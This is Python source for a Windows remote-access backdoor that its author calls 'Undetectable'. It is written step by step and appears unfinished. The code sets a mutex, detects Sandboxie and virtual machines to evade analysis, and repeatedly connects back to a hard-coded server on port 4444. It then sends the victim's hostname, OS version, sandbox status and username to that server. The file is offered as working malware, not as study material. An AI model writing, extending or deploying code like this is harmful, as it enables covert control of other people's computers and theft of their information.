""" Yakuza Backdoor, Undetectable, Client Side
        This is a Backdoor written in Python based on Yakuza Style
        Version: 1.0
------------------------------------------------------------
Author: Davood Yakuza
Start Developing Date: 11/9/2024 | 19 aban 1403.
End Developing Date:

"""

# Step 1: Import requires libraries
import socket
from os import path, environ
from sys import argv, exit
import platform
from time import sleep
import ctypes
import subprocess
import threading
from wmi import WMI

import win32api
import winerror
import win32event
import win32crypt

from winreg import *



# Step 2: Define Global Variables
SERVER_HOST = "192.168.10.100"
SERVER_PORT = 4444

strPATH = path.realpath(argv[0])
TMP = environ['APPDATA']

intBuffer = 1024

# Step 3: Define and Create Mutex Object
mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")

if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    exit(0)

#  Step 4: Define a Function to Detect Sandboxie
def detect_sandboxie():
    try:
        libHandle = ctypes.windll.LoadLibrary("SbieDll.dll")
        return " (Sandboxie) "

    except: return ""


# Step 5: Define a Function to Detect VM
def detectVM():
    objWMI = WMI()

    for diskDrive in objWMI.query("Select * from Win32_DiskDrive"):
        if 'vbox' in diskDrive.Caption.lower() or 'virtual' in diskDrive.Caption.lower():
            return " (Virtual Machine) "

    return ""

# Step 6: Define a Function to Connect Client to the Server
def server_connect():
    global objSocket

    while True:
        # Try to Create a Socket Connection and Connect to Server
        try:
            objSocket = socket.socket()
            objSocket.connect((SERVER_HOST, SERVER_PORT))

        # Handle Socket Connection Error
        except socket.error:
            sleep(5)

        else: break

    strUserInfo = (socket.gethostname() + "'," + platform.system() + " " + platform.release() +
                   detect_sandboxie() + detectVM() + "'," + environ["USERNAME"])

    send(str.encode(strUserInfo))



# Step 7: Define `decode_utf8, recv, send` Lambda's
decode_utf8 = lambda data: data.decode('utf-8')

recv = lambda buffer: objSocket.recv(buffer)

send = lambda data: objSocket.send(data)











